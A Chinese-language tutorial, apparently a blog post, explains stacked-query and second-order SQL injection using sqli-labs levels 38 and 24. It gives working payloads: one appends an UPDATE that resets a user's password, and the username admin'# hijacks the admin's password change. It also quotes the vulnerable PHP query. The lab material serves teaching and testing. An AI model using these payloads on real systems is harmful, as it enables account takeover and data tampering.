堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325120628613.png)

执行

`id=1';update users set password='123456' where id=1; --+ `

意思就是再更新id=1的用户密码为123456。如下成功执行了更新密码的语句

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325120909611.png)

#### 堆叠查询的局限性

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息

### 二阶注入

二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。

1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。
2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。
4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。
5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功

总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。以sqli-labs第24关为例

#### sqli-labs less-24

1. 如下点击注册用户

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325171938838.png)

这里注册用户名为 admin'#

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/2021032517204294.png)

此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172142765.png)

2. 对注册的账号进行登录然后修改密码为ccccc

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172253439.png)

此时提示密码已经成功修改了

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172320556.png)

此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin'#的密码并没有被修改

![](https://xxxiuron-picture.oss-cn-chengdu.aliyuncs.com/20210325172540390.png)

##### 漏洞原因

1. 在进行用户注册的允许存在'和#这种特殊字符

2. 在修改密码页面的源码中，发现这里很明显存在注入漏洞

`$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";`

当我们登录账号admin'#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc

`$sql = "UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' ";`

六、sql注入getshell的几种方式
传送门 -》[sql注入getshell的几种方式](https://blog.csdn.net/qq_44159028/article/details/116274542)